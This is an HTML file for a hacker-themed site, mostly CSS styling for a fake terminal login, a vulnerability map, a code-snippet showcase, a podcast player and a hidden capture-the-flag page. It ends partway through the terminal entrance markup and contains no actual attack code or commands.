# index.html
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>./access_denied - The Terminal</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
    <style>
        /* ===== ROOT VARIABLES ===== */
        :root {
            --bg-primary: #0d0d0d;
            --bg-secondary: #111111;
            --bg-terminal: #0a0a0a;
            --green-neon: #00ff41;
            --green-dark: #00cc33;
            --green-glow: rgba(0, 255, 65, 0.3);
            --red-blood: #dc143c;
            --red-glow: rgba(220, 20, 60, 0.3);
            --text-primary: #e0e0e0;
            --text-dim: #666666;
            --border-color: #1a1a1a;
            --cyan: #00d4ff;
            --amber: #ffb000;
        }

        /* ===== GLOBAL RESET ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'Fira Code', 'Share Tech Mono', monospace;
            overflow-x: hidden;
            cursor: default;
        }

        ::selection {
            background: var(--green-neon);
            color: var(--bg-primary);
        }

        ::-webkit-scrollbar {
            width: 6px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-primary);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--green-dark);
            border-radius: 3px;
        }

        /* ===== MATRIX RAIN BACKGROUND ===== */
        #matrix-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.06;
            pointer-events: none;
        }

        /* ===== SCANLINE OVERLAY ===== */
        .scanline-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
            background: repeating-linear-gradient(
                0deg,
                transparent,
                transparent 2px,
                rgba(0, 0, 0, 0.08) 2px,
                rgba(0, 0, 0, 0.08) 4px
            );
        }

        /* ===== GLITCH EFFECT ===== */
        @keyframes glitch-1 {
            0%, 100% { clip-path: inset(0 0 0 0); transform: translate(0); }
            20% { clip-path: inset(20% 0 60% 0); transform: translate(-3px, 2px); }
            40% { clip-path: inset(60% 0 10% 0); transform: translate(3px, -1px); }
            60% { clip-path: inset(40% 0 30% 0); transform: translate(-2px, 1px); }
            80% { clip-path: inset(80% 0 5% 0); transform: translate(2px, -2px); }
        }

        @keyframes glitch-2 {
            0%, 100% { clip-path: inset(0 0 0 0); transform: translate(0); }
            20% { clip-path: inset(10% 0 70% 0); transform: translate(2px, -1px); }
            40% { clip-path: inset(50% 0 20% 0); transform: translate(-3px, 2px); }
            60% { clip-path: inset(30% 0 50% 0); transform: translate(1px, -2px); }
            80% { clip-path: inset(70% 0 10% 0); transform: translate(-1px, 1px); }
        }

        @keyframes flicker {
            0%, 100% { opacity: 1; }
            92% { opacity: 1; }
            93% { opacity: 0.8; }
            94% { opacity: 1; }
            96% { opacity: 0.6; }
            97% { opacity: 1; }
        }

        @keyframes pulse-glow {
            0%, 100% { text-shadow: 0 0 10px var(--green-glow), 0 0 20px var(--green-glow); }
            50% { text-shadow: 0 0 20px var(--green-glow), 0 0 40px var(--green-glow), 0 0 60px var(--green-glow); }
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }

        @keyframes typing-cursor {
            0%, 100% { border-right-color: var(--green-neon); }
            50% { border-right-color: transparent; }
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-50px); }
            to { opacity: 1; transform: translateX(0); }
        }

        @keyframes matrixFade {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        @keyframes borderGlow {
            0%, 100% { border-color: var(--green-dark); box-shadow: 0 0 5px var(--green-glow); }
            50% { border-color: var(--green-neon); box-shadow: 0 0 15px var(--green-glow), 0 0 30px var(--green-glow); }
        }

        @keyframes radioStatic {
            0% { background-position: 0 0; }
            100% { background-position: 100% 100%; }
        }

        .glitch-text {
            position: relative;
            animation: flicker 5s infinite;
        }

        .glitch-text::before,
        .glitch-text::after {
            content: attr(data-text);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
        }

        .glitch-text:hover::before {
            opacity: 0.8;
            color: var(--red-blood);
            animation: glitch-1 0.3s infinite;
            z-index: -1;
        }

        .glitch-text:hover::after {
            opacity: 0.8;
            color: var(--cyan);
            animation: glitch-2 0.3s infinite;
            z-index: -1;
        }

        /* ===== TERMINAL ENTRANCE ===== */
        #terminal-entrance {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1000;
            background: var(--bg-primary);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
        }

        #terminal-entrance.unlocked {
            opacity: 0;
            transform: scale(1.1);
            pointer-events: none;
        }

        .terminal-box {
            width: 90%;
            max-width: 750px;
            background: var(--bg-terminal);
            border: 1px solid #333;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8), 0 0 100px rgba(0, 255, 65, 0.05);
        }

        .terminal-header {
            background: #1a1a1a;
            padding: 10px 15px;
            display: flex;
            align-items: center;
            gap: 8px;
            border-bottom: 1px solid #333;
        }

        .terminal-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }

        .dot-red { background: #ff5f57; }
        .dot-yellow { background: #febc2e; }
        .dot-green { background: #28c840; }

        .terminal-title {
            color: var(--text-dim);
            font-size: 12px;
            margin-right: auto;
            margin-left: 10px;
        }

        .terminal-body {
            padding: 30px;
            min-height: 350px;
            font-size: 14px;
            line-height: 2;
        }

        .terminal-line {
            margin-bottom: 5px;
            opacity: 0;
            animation: fadeInUp 0.3s forwards;
        }

        .terminal-line .prompt {
            color: var(--green-neon);
        }

        .terminal-line .path {
            color: var(--cyan);
        }

        .terminal-line .command {
            color: var(--text-primary);
        }

        .terminal-line .comment {
            color: var(--text-dim);
        }

        .terminal-line .error {
            color: var(--red-blood);
        }

        .terminal-line .success {
            color: var(--green-neon);
        }

        .terminal-line .warning {
            color: var(--amber);
        }

        .terminal-input-line {
            display: flex;
            align-items: center;
            margin-top: 15px;
        }

        .terminal-input-line .prompt-symbol {
            color: var(--green-neon);
            margin-left: 8px;
            font-size: 14px;
        }

        #terminal-input {
            background: transparent;
            border: none;
            color: var(--green-neon);
            font-family: 'Fira Code', monospace;
            font-size: 14px;
            flex: 1;
            outline: none;
            caret-color: var(--green-neon);
            direction: ltr;
            text-align: left;
        }

        .cursor-blink {
            display: inline-block;
            width: 8px;
            height: 16px;
            background: var(--green-neon);
            animation: blink 1s step-end infinite;
            vertical-align: middle;
            margin-right: 2px;
        }

        .ascii-art {
            color: var(--green-neon);
            font-family: 'VT323', monospace;
            font-size: 11px;
            line-height: 1.2;
            text-align: center;
            margin: 15px 0;
            text-shadow: 0 0 10px var(--green-glow);
            direction: ltr;
            white-space: pre;
        }

        .hint-text {
            color: var(--text-dim);
            font-size: 11px;
            text-align: center;
            margin-top: 20px;
            animation: pulse-glow 3s infinite;
        }

        /* ===== MAIN CONTENT ===== */
        #main-content {
            display: none;
            position: relative;
            z-index: 2;
        }

        #main-content.visible {
            display: block;
            animation: matrixFade 1s ease-out;
        }

        /* ===== NAVIGATION ===== */
        .nav-bar {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            z-index: 100;
            background: rgba(13, 13, 13, 0.95);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid var(--border-color);
            padding: 0 30px;
            transition: all 0.3s;
        }

        .nav-bar.scrolled {
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.1);
        }

        .nav-inner {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 60px;
        }

        .nav-logo {
            display: flex;
            align-items: center;
            gap: 10px;
            text-decoration: none;
            color: var(--green-neon);
            font-size: 18px;
            font-weight: 700;
        }

        .nav-logo .logo-bracket {
            color: var(--red-blood);
            font-size: 22px;
        }

        .nav-links {
            display: flex;
            gap: 5px;
            list-style: none;
        }

        .nav-links a {
            color: var(--text-dim);
            text-decoration: none;
            font-size: 13px;
            padding: 8px 16px;
            border-radius: 4px;
            transition: all 0.3s;
            position: relative;
        }

        .nav-links a:hover,
        .nav-links a.active {
            color: var(--green-neon);
            background: rgba(0, 255, 65, 0.05);
        }

        .nav-links a::before {
            content: '>';
            margin-left: 5px;
            opacity: 0;
            transition: opacity 0.3s;
            color: var(--green-neon);
        }

        .nav-links a:hover::before,
        .nav-links a.active::before {
            opacity: 1;
        }

        .nav-status {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 11px;
            color: var(--text-dim);
        }

        .status-dot {
            width: 8px;
            height: 8px;
            background: var(--green-neon);
            border-radius: 50%;
            animation: pulse-glow 2s infinite;
            box-shadow: 0 0 10px var(--green-glow);
        }

        /* Mobile Menu */
        .mobile-menu-btn {
            display: none;
            background: none;
            border: 1px solid var(--green-dark);
            color: var(--green-neon);
            padding: 8px 12px;
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            cursor: pointer;
            border-radius: 4px;
        }

        /* ===== HERO SECTION ===== */
        .hero-section {
            padding: 120px 30px 80px;
            max-width: 1200px;
            margin: 0 auto;
            position: relative;
        }

        .hero-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 60px;
            align-items: center;
        }

        .hero-text-side {
            direction: ltr;
            text-align: left;
        }

        .hero-tag {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(0, 255, 65, 0.05);
            border: 1px solid rgba(0, 255, 65, 0.2);
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 12px;
            color: var(--green-neon);
            margin-bottom: 25px;
        }

        .hero-tag .tag-dot {
            width: 6px;
            height: 6px;
            background: var(--green-neon);
            border-radius: 50%;
            animation: blink 2s infinite;
        }

        .hero-name {
            font-size: 52px;
            font-weight: 700;
            line-height: 1.2;
            margin-bottom: 10px;
        }

        .hero-name .first-name {
            color: var(--text-primary);
        }

        .hero-name .last-name {
            color: var(--green-neon);
            text-shadow: 0 0 30px var(--green-glow);
        }

        .hero-title {
            font-size: 18px;
            color: var(--text-dim);
            margin-bottom: 25px;
            line-height: 1.6;
        }

        .hero-title .highlight {
            color: var(--red-blood);
        }

        .hero-stats {
            display: flex;
            gap: 30px;
            margin-bottom: 30px;
        }

        .stat-item {
            text-align: center;
        }

        .stat-number {
            font-size: 28px;
            font-weight: 700;
            color: var(--green-neon);
            display: block;
            text-shadow: 0 0 20px var(--green-glow);
        }

        .stat-label {
            font-size: 11px;
            color: var(--text-dim);
            margin-top: 4px;
        }

        .hero-buttons {
            display: flex;
            gap: 15px;
        }

        .btn-primary {
            background: var(--green-neon);
            color: var(--bg-primary);
            border: none;
            padding: 12px 28px;
            font-family: 'Fira Code', monospace;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .btn-primary:hover {
            box-shadow: 0 0 20px var(--green-glow), 0 0 40px var(--green-glow);
            transform: translateY(-2px);
        }

        .btn-secondary {
            background: transparent;
            color: var(--green-neon);
            border: 1px solid var(--green-dark);
            padding: 12px 28px;
            font-family: 'Fira Code', monospace;
            font-size: 13px;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .btn-secondary:hover {
            background: rgba(0, 255, 65, 0.1);
            border-color: var(--green-neon);
        }

        /* Hero ASCII Side */
        .hero-ascii-side {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .hero-ascii-art {
            font-family: 'VT323', monospace;
            font-size: 14px;
            line-height: 1.3;
            color: var(--green-neon);
            text-shadow: 0 0 10px var(--green-glow);
            white-space: pre;
            direction: ltr;
            text-align: center;
            animation: pulse-glow 4s infinite;
            background: rgba(0, 255, 65, 0.02);
            padding: 30px;
            border: 1px solid rgba(0, 255, 65, 0.1);
            border-radius: 8px;
        }

        /* ===== SECTION STYLING ===== */
        .section {
            padding: 80px 30px;
            max-width: 1400px;
            margin: 0 auto;
        }

        .section-header {
            margin-bottom: 50px;
            direction: ltr;
            text-align: left;
        }

        .section-tag {
            color: var(--text-dim);
            font-size: 12px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .section-tag::before {
            content: '';
            width: 30px;
            height: 1px;
            background: var(--green-dark);
        }

        .section-title {
            font-size: 32px;
            font-weight: 700;
            color: var(--green-neon);
            text-shadow: 0 0 20px var(--green-glow);
        }

        .section-title .red {
            color: var(--red-blood);
        }

        .section-divider {
            width: 100%;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--green-dark), transparent);
            margin: 0 0 60px 0;
        }

        /* ===== VULNERABILITY MAP ===== */
        .vuln-map-container {
            position: relative;
        }

        .world-map-wrapper {
            position: relative;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 40px;
            overflow: hidden;
        }

        .map-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }

        .country-card {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 20px;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .country-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 3px;
            height: 100%;
            background: var(--red-blood);
            transform: scaleY(0);
            transition: transform 0.3s;
        }

        .country-card:hover {
            border-color: var(--red-blood);
            box-shadow: 0 0 20px var(--red-glow);
            transform: translateY(-3px);
        }

        .country-card:hover::before {
            transform: scaleY(1);
        }

        .country-flag {
            font-size: 28px;
            margin-bottom: 10px;
        }

        .country-name {
            color: var(--text-primary);
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 5px;
        }

        .country-vuln-count {
            color: var(--red-blood);
            font-size: 12px;
        }

        .country-year {
            color: var(--text-dim);
            font-size: 11px;
            margin-top: 5px;
        }

        /* Vulnerability Detail Modal */
        .vuln-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 500;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            justify-content: center;
            align-items: center;
            padding: 30px;
        }

        .vuln-modal.active {
            display: flex;
        }

        .vuln-modal-content {
            background: var(--bg-secondary);
            border: 1px solid var(--red-blood);
            border-radius: 8px;
            width: 100%;
            max-width: 700px;
            max-height: 80vh;
            overflow-y: auto;
            animation: matrixFade 0.3s ease-out;
        }

        .vuln-modal-header {
            padding: 20px 25px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .vuln-modal-header h3 {
            color: var(--red-blood);
            font-size: 18px;
        }

        .vuln-close-btn {
            background: none;
            border: 1px solid var(--text-dim);
            color: var(--text-dim);
            width: 30px;
            height: 30px;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'Fira Code', monospace;
            font-size: 14px;
            transition: all 0.3s;
        }

        .vuln-close-btn:hover {
            border-color: var(--red-blood);
            color: var(--red-blood);
        }

        .vuln-modal-body {
            padding: 25px;
            direction: ltr;
            text-align: left;
        }

        .vuln-info-row {
            display: flex;
            margin-bottom: 12px;
            font-size: 13px;
        }

        .vuln-info-label {
            color: var(--text-dim);
            min-width: 120px;
        }

        .vuln-info-value {
            color: var(--text-primary);
        }

        .vuln-severity {
            display: inline-block;
            padding: 2px 10px;
            border-radius: 3px;
            font-size: 11px;
            font-weight: 600;
        }

        .severity-critical {
            background: rgba(220, 20, 60, 0.2);
            color: var(--red-blood);
            border: 1px solid var(--red-blood);
        }

        .severity-high {
            background: rgba(255, 176, 0, 0.2);
            color: var(--amber);
            border: 1px solid var(--amber);
        }

        .vuln-description {
            margin-top: 20px;
            padding: 15px;
            background: var(--bg-terminal);
            border-radius: 4px;
            font-size: 13px;
            line-height: 1.8;
            color: var(--text-primary);
            border-left: 3px solid var(--red-blood);
        }

        /* ===== SCRIPT VAULT (CODE EDITOR) ===== */
        .scripts-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(500px, 1fr));
            gap: 25px;
        }

        .code-editor {
            background: var(--bg-terminal);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            overflow: hidden;
            transition: all 0.3s;
        }

        .code-editor:hover {
            border-color: var(--green-dark);
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.05);
        }

        .editor-header {
            background: #1a1a1a;
            padding: 10px 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #252525;
        }

        .editor-tabs {
            display: flex;
            align-items: center;
            gap: 2px;
        }

        .editor-tab {
            padding: 4px 12px;
            font-size: 12px;
            color: var(--text-dim);
            background: transparent;
            border-radius: 4px 4px 0 0;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .editor-tab.active {
            background: var(--bg-terminal);
            color: var(--text-primary);
        }

        .editor-tab .file-icon {
            font-size: 10px;
        }

        .editor-tab .python-icon { color: #3776AB; }
        .editor-tab .csharp-icon { color: #68217A; }
        .editor-tab .bash-icon { color: var(--green-neon); }

        .editor-actions {
            display: flex;
            gap: 8px;
        }

        .copy-btn {
            background: rgba(0, 255, 65, 0.1);
            border: 1px solid var(--green-dark);
            color: var(--green-neon);
            padding: 4px 12px;
            font-family: 'Fira Code', monospace;
            font-size: 11px;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .copy-btn:hover {
            background: var(--green-neon);
            color: var(--bg-primary);
        }

        .copy-btn.copied {
            background: var(--green-neon);
            color: var(--bg-primary);
        }

        .editor-body {
            padding: 20px;
            overflow-x: auto;
            direction: ltr;
            text-align: left;
        }

        .code-content {
            font-size: 13px;
            line-height: 1.8;
            tab-size: 4;
        }

        .code-content .line-number {
            color: #444;
            display: inline-block;
            width: 35px;
            text-align: right;
            margin-left: 15px;
            user-select: none;
        }

        .code-content .keyword { color: #ff79c6; }
        .code-content .function { color: #50fa7b; }
        .code-content .string { color: #f1fa8c; }
        .code-content .comment { color: #6272a4; }
        .code-content .variable { color: #8be9fd; }
        .code-content .operator { color: #ff79c6; }
        .code-content .number { color: #bd93f9; }
        .code-content .decorator { color: #ffb86c; }
        .code-content .import-kw { color: #ff79c6; }
        .code-content .module { color: #8be9fd; }
        .code-content .class-name { color: #50fa7b; }
        .code-content .param { color: #ffb86c; }
        .code-content .builtin { color: #8be9fd; }

        .editor-footer {
            padding: 6px 15px;
            background: #1a1a1a;
            border-top: 1px solid #252525;
            display: flex;
            justify-content: space-between;
            font-size: 11px;
            color: var(--text-dim);
        }

        .script-info {
            margin-top: 15px;
            padding: 15px;
            background: rgba(0, 255, 65, 0.02);
            border: 1px solid var(--border-color);
            border-radius: 4px;
        }

        .script-info h4 {
            color: var(--green-neon);
            font-size: 14px;
            margin-bottom: 8px;
        }

        .script-info p {
            color: var(--text-dim);
            font-size: 12px;
            line-height: 1.6;
        }

        .script-tags {
            display: flex;
            gap: 8px;
            margin-top: 10px;
            flex-wrap: wrap;
        }

        .script-tag {
            padding: 3px 10px;
            background: rgba(0, 255, 65, 0.05);
            border: 1px solid rgba(0, 255, 65, 0.15);
            border-radius: 3px;
            font-size: 11px;
            color: var(--green-dark);
        }

        /* ===== PODCAST SECTION ===== */
        .podcast-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 25px;
        }

        .podcast-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            overflow: hidden;
            transition: all 0.3s;
        }

        .podcast-card:hover {
            border-color: var(--amber);
            box-shadow: 0 0 20px rgba(255, 176, 0, 0.1);
        }

        /* Radio Player Design */
        .radio-player {
            background: linear-gradient(145deg, #1a1810, #0d0d0a);
            padding: 25px;
            position: relative;
        }

        .radio-top {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 20px;
        }

        .radio-display {
            flex: 1;
            background: #0a0a08;
            border: 2px solid #333;
            border-radius: 4px;
            padding: 12px;
            position: relative;
        }

        .radio-display::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(transparent 50%, rgba(0, 0, 0, 0.1) 50%);
            background-size: 100% 4px;
            pointer-events: none;
        }

        .radio-frequency {
            color: var(--amber);
            font-family: 'VT323', monospace;
            font-size: 24px;
            text-shadow: 0 0 10px rgba(255, 176, 0, 0.5);
            text-align: center;
        }

        .radio-label {
            color: #666;
            font-size: 10px;
            text-align: center;
            margin-top: 4px;
        }

        .radio-indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            border: 2px solid #444;
        }

        .radio-indicator.active {
            background: var(--green-neon);
            box-shadow: 0 0 10px var(--green-glow);
            animation: blink 1.5s infinite;
        }

        .radio-indicator.inactive {
            background: var(--red-blood);
            opacity: 0.5;
        }

        .radio-controls {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
        }

        .radio-btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(145deg, #2a2a2a, #1a1a1a);
            border: 2px solid #333;
            color: var(--text-dim);
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Fira Code', monospace;
        }

        .radio-btn:hover {
            border-color: var(--amber);
            color: var(--amber);
        }

        .radio-btn.play-btn {
            width: 50px;
            height: 50px;
            font-size: 16px;
            border-color: var(--amber);
            color: var(--amber);
        }

        .radio-btn.play-btn:hover {
            background: var(--amber);
            color: var(--bg-primary);
            box-shadow: 0 0 20px rgba(255, 176, 0, 0.3);
        }

        .radio-btn.play-btn.playing {
            background: var(--amber);
            color: var(--bg-primary);
            animation: pulse-glow 2s infinite;
        }

        /* Waveform Visualizer */
        .waveform {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 2px;
            height: 30px;
            margin-top: 15px;
        }

        .wave-bar {
            width: 3px;
            background: var(--amber);
            border-radius: 2px;
            opacity: 0.3;
            transition: height 0.1s;
        }

        .wave-bar.active {
            opacity: 1;
            animation: waveAnim 0.5s ease infinite alternate;
        }

        @keyframes waveAnim {
            from { height: 5px; }
            to { height: var(--wave-height, 20px); }
        }

        .radio-progress {
            margin-top: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .progress-time {
            font-size: 11px;
            color: var(--text-dim);
            font-family: 'VT323', monospace;
            min-width: 40px;
        }

        .progress-bar-container {
            flex: 1;
            height: 4px;
            background: #222;
            border-radius: 2px;
            position: relative;
            cursor: pointer;
        }

        .progress-bar-fill {
            height: 100%;
            background: var(--amber);
            border-radius: 2px;
            width: 0%;
            transition: width 0.1s;
        }

        .podcast-details {
            padding: 20px;
        }

        .podcast-episode {
            color: var(--amber);
            font-size: 11px;
            margin-bottom: 8px;
        }

        .podcast-title {
            color: var(--text-primary);
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 8px;
            line-height: 1.4;
        }

        .podcast-desc {
            color: var(--text-dim);
            font-size: 12px;
            line-height: 1.6;
        }

        .podcast-meta {
            display: flex;
            gap: 15px;
            margin-top: 12px;
            font-size: 11px;
            color: var(--text-dim);
        }

        /* ===== CTF HIDDEN CHALLENGE ===== */
        /* The hidden path is: /s3cr3t_r00m_7734 */
        /* Can you find it? Check the console... */

        .ctf-banner {
            background: rgba(220, 20, 60, 0.05);
            border: 1px dashed var(--red-blood);
            border-radius: 8px;
            padding: 30px;
            text-align: center;
            margin: 60px 30px;
            max-width: 800px;
            margin-left: auto;
            margin-right: auto;
        }

        .ctf-banner h3 {
            color: var(--red-blood);
            font-size: 20px;
            margin-bottom: 10px;
        }

        .ctf-banner p {
            color: var(--text-dim);
            font-size: 13px;
            line-height: 1.6;
        }

        .ctf-banner .ctf-hint {
            margin-top: 15px;
            padding: 10px;
            background: var(--bg-terminal);
            border-radius: 4px;
            font-size: 12px;
            color: var(--amber);
            direction: ltr;
        }

        /* ===== HIDDEN PAGE ===== */
        #hidden-page {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2000;
            background: var(--bg-primary);
            overflow-y: auto;
            padding: 50px;
        }

        #hidden-page.revealed {
            display: block;
            animation: matrixFade 0.5s ease-out;
        }

        .hidden-content {
            max-width: 700px;
            margin: 0 auto;
            direction: ltr;
            text-align: left;
        }

        .hidden-content .congrats {
            color: var(--green-neon);
            font-size: 36px;
            font-weight: 700;
            text-shadow: 0 0 30px var(--green-glow);
            margin-bottom: 20px;
        }

        .hidden-content .trophy-ascii {
            color: var(--amber);
            font-family: 'VT323', monospace;
            font-size: 12px;
            line-height: 1.2;
            margin: 20px 0;
            white-space: pre;
            text-shadow: 0 0 10px rgba(255, 176, 0, 0.3);
        }

        .hidden-content .secret-msg {
            color: var(--text-primary);
            font-size: 14px;
            line-height: 2;
            padding: 20px;
            background: var(--bg-secondary);
            border: 1px solid var(--green-dark);
            border-radius: 8px;
        }

        .hidden-close-btn {
            margin-top: 20px;
            background: var(--red-blood);
            color: white;
            border: none;
            padding: 10px 25px;
            font-family: 'Fira Code', monospace;
            font-size: 13px;
            cursor: pointer;
            border-radius: 4px;
        }

        /* ===== FOOTER ===== */
        .footer {
            padding: 40px 30px;
            border-top: 1px solid var(--border-color);
            text-align: center;
        }

        .footer-ascii {
            color: var(--green-dark);
            font-family: 'VT323', monospace;
            font-size: 10px;
            opacity: 0.4;
            line-height: 1.2;
            white-space: pre;
            margin-bottom: 15px;
            direction: ltr;
        }

        .footer-text {
            color: var(--text-dim);
            font-size: 12px;
            direction: ltr;
        }

        .footer-text .green { color: var(--green-dark); }
        .footer-text .red { color: var(--red-blood); }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 15px;
        }

        .footer-links a {
            color: var(--text-dim);
            text-decoration: none;
            font-size: 12px;
            transition: color 0.3s;
        }

        .footer-links a:hover {
            color: var(--green-neon);
        }

        /* ===== TYPING EFFECT ===== */
        .type-effect {
            overflow: hidden;
            white-space: nowrap;
            border-left: 2px solid var(--green-neon);
            animation: typing-cursor 0.8s step-end infinite;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 1024px) {
            .scripts-grid {
                grid-template-columns: 1fr;
            }
        }

        @media (max-width: 768px) {
            .hero-grid {
                grid-template-columns: 1fr;
                gap: 30px;
            }

            .hero-ascii-side {
                display: none;
            }

            .hero-name {
                font-size: 36px;
            }

            .hero-stats {
                gap: 20px;
            }

            .hero-buttons {
                flex-direction: column;
            }

            .nav-links {
                display: none;
            }

            .mobile-menu-btn {
                display: block;
            }

            .nav-links.mobile-open {
                display: flex;
                flex-direction: column;
                position: absolute;
                top: 60px;
                left: 0;
                width: 100%;
                background: rgba(13, 13, 13, 0.98);
                padding: 20px;
                border-bottom: 1px solid var(--border-color);
            }

            .map-grid {
                grid-template-columns: repeat(2, 1fr);
            }

            .podcast-grid {
                grid-template-columns: 1fr;
            }

            .section-title {
                font-size: 24px;
            }

            .terminal-body {
                padding: 20px;
                font-size: 12px;
            }

            .ascii-art {
                font-size: 8px;
            }
        }

        @media (max-width: 480px) {
            .map-grid {
                grid-template-columns: 1fr;
            }

            .hero-stats {
                flex-wrap: wrap;
            }
        }

        /* ===== L33T SPEAK STYLING ===== */
        .leet {
            font-family: 'VT323', monospace;
            color: var(--text-dim);
            font-size: 14px;
            letter-spacing: 2px;
        }
    </style>
</head>
<body>

<!-- Matrix Rain Canvas -->
<canvas id="matrix-canvas"></canvas>

<!-- Scanline Overlay -->
<div class="scanline-overlay"></div>

<!-- ==================== TERMINAL ENTRANCE ==================== -->
<div id="terminal-entrance">
    <div class="terminal-box">
        <div class="terminal-header">
            <div class="terminal-dot dot-red"></div>
            <div class="terminal-dot dot-yellow"></div>
            <div class="terminal-dot dot-green"></div>
            <span class="terminal-title">root@darknet:~/access_panel</span>
        </div>
        <div class="terminal-body">
            <div class="ascii-art" id="ascii-banner">
 ██████╗  █████╗ ██████╗ ██╗  ██╗    ███╗   ██╗███████╗████████╗
 ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ████╗  ██║██╔════╝╚══██╔══╝
 ██║  ██║███████║██████╔╝█████╔╝     ██╔██╗ ██║█████╗     ██║
 ██║  ██║██╔══██║██╔══██╗██╔═██╗     ██║╚██╗██║██╔══╝     ██║
 ██████╔╝██║  ██║██║  ██║██║  ██╗    ██║ ╚████║███████╗   ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝╚══════╝   ╚═╝
            </div>

            <div class="terminal-line" style="animation-delay: 0.5s">
                <span class="comment">// System boot sequence initiated...</span>
            </div>
            <div class="terminal-line" style="animation-delay: 0.8s">
                <span class="success">[✓]</span> <span class="command">Loading kernel modules...</span>
            </div>
            <div class="terminal-line" style="animation-delay: 1.1s">
                <span class="success">[✓]</span> <span class="command">Initializing encrypted filesystem...</span>
            </div>
            <div class="terminal-line" style="animation-delay: 1.4s">
                <span class="success">[✓]</span> <span class="command">Establishing secure connection...</span>
            </div>
            <div class="terminal-line" style="animation-delay: 1.7s">
                <span class="warning">[!]</span> <span class="command">Authentication required</span>
            </div>
            <div class="terminal-line" style="animation-delay: 2s">
                <span class="comment">// Type the access command to proceed</span>
            </div>

